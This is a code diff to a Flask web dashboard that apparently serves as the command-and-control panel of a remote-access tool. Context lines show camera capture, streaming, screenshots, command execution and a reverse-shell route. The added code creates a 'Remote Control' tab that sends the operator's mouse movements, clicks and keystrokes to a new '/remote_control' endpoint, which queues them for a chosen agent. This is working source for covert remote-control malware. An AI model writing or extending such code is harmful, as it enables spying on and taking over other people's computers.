@@ -563,6 +563,9 @@ DASHBOARD_HTML = """
             <div class="nav-item" onclick="switchTab('voice')" id="nav-voice">
                 🎤 Voice Control
             </div>
+            <div class="nav-item" onclick="switchTab('remote')" id="nav-remote">
+                🖱️ Remote Control
+            </div>
         </div>
 
         <div class="grid">
@@ -657,6 +660,80 @@ DASHBOARD_HTML = """
                             <div class="voice-commands-info" style="margin-top: 15px;">
                                 <small style="color: var(--text-secondary);">
                                     Voice commands: "screenshot", "start camera", "stop camera", "start streaming", "stop streaming", "system info", "list processes", "current directory", "run [command]"
+                                </small>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Remote Control Tab -->
+                    <div id="tab-remote" class="tab-content">
+                        <div class="control-group">
+                            <div class="control-header">Remote Control</div>
+                            <button class="btn" onclick="startRemoteControl()" id="remote-start-btn">Start Remote Control</button>
+                            <button class="btn btn-danger" onclick="stopRemoteControl()" id="remote-stop-btn">Stop Remote Control</button>
+                            <div id="remote-status" class="status-indicator"></div>
+                            
+                            <div class="section-divider"></div>
+                            
+                            <div class="control-header">Mouse & Keyboard Sync</div>
+                            <div class="remote-control-section">
+                                <div class="remote-control-area" id="remote-control-area" style="
+                                    width: 100%;
+                                    height: 300px;
+                                    border: 2px solid var(--border-color);
+                                    border-radius: 10px;
+                                    background: var(--secondary-bg);
+                                    display: flex;
+                                    align-items: center;
+                                    justify-content: center;
+                                    cursor: crosshair;
+                                    position: relative;
+                                    overflow: hidden;
+                                ">
+                                    <div id="remote-instructions" style="text-align: center; color: var(--text-secondary);">
+                                        <div style="font-size: 2rem; margin-bottom: 10px;">🖱️⌨️</div>
+                                        <div>Click "Start Remote Control" to begin</div>
+                                        <div style="font-size: 0.8rem; margin-top: 5px;">
+                                            Mouse movements and keyboard input will be synchronized with the agent
+                                        </div>
+                                    </div>
+                                    <div id="mouse-cursor" style="
+                                        position: absolute;
+                                        width: 12px;
+                                        height: 12px;
+                                        background: var(--accent-green);
+                                        border-radius: 50%;
+                                        pointer-events: none;
+                                        display: none;
+                                        transform: translate(-50%, -50%);
+                                        z-index: 10;
+                                    "></div>
+                                </div>
+                            </div>
+                            
+                            <div class="control-group" style="margin-top: 15px;">
+                                <div class="control-header">Settings</div>
+                                <div class="input-group">
+                                    <label class="input-label">Mouse Sensitivity</label>
+                                    <input type="range" id="mouse-sensitivity" min="0.1" max="3" step="0.1" value="1" style="width: 100%;">
+                                    <span id="sensitivity-value" style="color: var(--text-secondary); font-size: 0.8rem;">1.0x</span>
+                                </div>
+                                <div style="display: flex; gap: 10px; margin-top: 10px;">
+                                    <label style="display: flex; align-items: center; gap: 5px; color: var(--text-secondary);">
+                                        <input type="checkbox" id="sync-mouse" checked>
+                                        Sync Mouse
+                                    </label>
+                                    <label style="display: flex; align-items: center; gap: 5px; color: var(--text-secondary);">
+                                        <input type="checkbox" id="sync-keyboard" checked>
+                                        Sync Keyboard
+                                    </label>
+                                </div>
+                            </div>
+                            
+                            <div class="remote-info" style="margin-top: 15px;">
+                                <small style="color: var(--text-secondary);">
+                                    Real-time synchronization: Move your mouse over the control area or type on your keyboard to control the remote agent.
+                                    The agent will mirror your mouse movements and keyboard inputs in real-time.
                                 </small>
                             </div>
                         </div>
@@ -1275,6 +1352,187 @@ DASHBOARD_HTML = """
             }, 3000);
         }
 
+        // Remote Control Functions
+        let remoteControlActive = false;
+        let mouseSensitivity = 1.0;
+        let syncMouse = true;
+        let syncKeyboard = true;
+        let remoteControlArea = null;
+
+        function startRemoteControl() {
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+
+            remoteControlActive = true;
+            remoteControlArea = document.getElementById('remote-control-area');
+            const instructions = document.getElementById('remote-instructions');
+            const mouseCursor = document.getElementById('mouse-cursor');
+            const statusDiv = document.getElementById('remote-status');
+
+            // Update UI
+            instructions.style.display = 'none';
+            mouseCursor.style.display = 'block';
+            statusDiv.style.display = 'block';
+            statusDiv.className = 'status-indicator status-success';
+            statusDiv.textContent = `Remote control active for agent ${selectedAgentId}`;
+
+            // Set up event listeners
+            setupRemoteControlListeners();
+            
+            showStatus('Remote control started successfully!', 'success');
+        }
+
+        function stopRemoteControl() {
+            remoteControlActive = false;
+            remoteControlArea = null;
+            const instructions = document.getElementById('remote-instructions');
+            const mouseCursor = document.getElementById('mouse-cursor');
+            const statusDiv = document.getElementById('remote-status');
+
+            // Update UI
+            instructions.style.display = 'block';
+            mouseCursor.style.display = 'none';
+            statusDiv.style.display = 'none';
+
+            // Remove event listeners
+            removeRemoteControlListeners();
+            
+            showStatus('Remote control stopped.', 'info');
+        }
+
+        function setupRemoteControlListeners() {
+            if (!remoteControlArea) return;
+
+            // Mouse movement listener
+            remoteControlArea.addEventListener('mousemove', handleMouseMove);
+            remoteControlArea.addEventListener('click', handleMouseClick);
+            remoteControlArea.addEventListener('contextmenu', handleRightClick);
+
+            // Keyboard listener (global)
+            document.addEventListener('keydown', handleKeyDown);
+            document.addEventListener('keyup', handleKeyUp);
+
+            // Settings listeners
+            const sensitivitySlider = document.getElementById('mouse-sensitivity');
+            sensitivitySlider.addEventListener('input', (e) => {
+                mouseSensitivity = parseFloat(e.target.value);
+                document.getElementById('sensitivity-value').textContent = mouseSensitivity.toFixed(1) + 'x';
+            });
+
+            document.getElementById('sync-mouse').addEventListener('change', (e) => {
+                syncMouse = e.target.checked;
+            });
+
+            document.getElementById('sync-keyboard').addEventListener('change', (e) => {
+                syncKeyboard = e.target.checked;
+            });
+        }
+
+        function removeRemoteControlListeners() {
+            if (remoteControlArea) {
+                remoteControlArea.removeEventListener('mousemove', handleMouseMove);
+                remoteControlArea.removeEventListener('click', handleMouseClick);
+                remoteControlArea.removeEventListener('contextmenu', handleRightClick);
+            }
+
+            document.removeEventListener('keydown', handleKeyDown);
+            document.removeEventListener('keyup', handleKeyUp);
+        }
+
+        function handleMouseMove(event) {
+            if (!remoteControlActive || !syncMouse) return;
+
+            const rect = remoteControlArea.getBoundingClientRect();
+            const x = event.clientX - rect.left;
+            const y = event.clientY - rect.top;
+
+            // Update cursor position
+            const mouseCursor = document.getElementById('mouse-cursor');
+            mouseCursor.style.left = x + 'px';
+            mouseCursor.style.top = y + 'px';
+
+            // Calculate relative position (0-1)
+            const relativeX = x / rect.width;
+            const relativeY = y / rect.height;
+
+            // Send mouse move command to agent
+            sendRemoteCommand({
+                type: 'mouse_move',
+                x: relativeX,
+                y: relativeY,
+                sensitivity: mouseSensitivity
+            });
+        }
+
+        function handleMouseClick(event) {
+            if (!remoteControlActive || !syncMouse) return;
+            
+            event.preventDefault();
+            sendRemoteCommand({
+                type: 'mouse_click',
+                button: 'left'
+            });
+        }
+
+        function handleRightClick(event) {
+            if (!remoteControlActive || !syncMouse) return;
+            
+            event.preventDefault();
+            sendRemoteCommand({
+                type: 'mouse_click',
+                button: 'right'
+            });
+        }
+
+        function handleKeyDown(event) {
+            if (!remoteControlActive || !syncKeyboard) return;
+
+            // Don't interfere with browser shortcuts or UI controls
+            if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') return;
+            if (event.ctrlKey || event.altKey || event.metaKey) return;
+
+            event.preventDefault();
+            sendRemoteCommand({
+                type: 'key_down',
+                key: event.key,
+                code: event.code
+            });
+        }
+
+        function handleKeyUp(event) {
+            if (!remoteControlActive || !syncKeyboard) return;
+
+            // Don't interfere with browser shortcuts or UI controls
+            if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') return;
+            if (event.ctrlKey || event.altKey || event.metaKey) return;
+
+            event.preventDefault();
+            sendRemoteCommand({
+                type: 'key_up',
+                key: event.key,
+                code: event.code
+            });
+        }
+
+        async function sendRemoteCommand(commandData) {
+            if (!selectedAgentId) return;
+
+            try {
+                await fetch('/remote_control', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        agent_id: selectedAgentId,
+                        ...commandData
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending remote command:', error);
+            }
+        }
+
         // Auto-refresh agents every 5 seconds
         setInterval(fetchAgents, 5000);
 
@@ -1747,6 +2005,27 @@ def receive_voice_command(agent_id):
     AGENTS_DATA[agent_id]["commands"].append(command)
     
     return jsonify({"status": "success", "message": f"Voice command '{command}' queued for execution"})
+
+@app.route("/remote_control", methods=["POST"])
+def remote_control():
+    """Handle remote control commands (mouse/keyboard)."""
+    data = request.json
+    agent_id = data.get("agent_id")
+    command_type = data.get("type")
+    
+    if not agent_id or not command_type:
+        return jsonify({"status": "error", "message": "agent_id and type required"}), 400
+    
+    # Queue the remote control command
+    remote_command = {
+        "type": "remote_control",
+        "action": command_type,
+        "data": data
+    }
+    
+    AGENTS_DATA[agent_id]["commands"].append(json.dumps(remote_command))
+    
+    return jsonify({"status": "success"})
 
 @app.route("/reverse_shell/<agent_id>", methods=["POST"])
 def reverse_shell_command(agent_id):
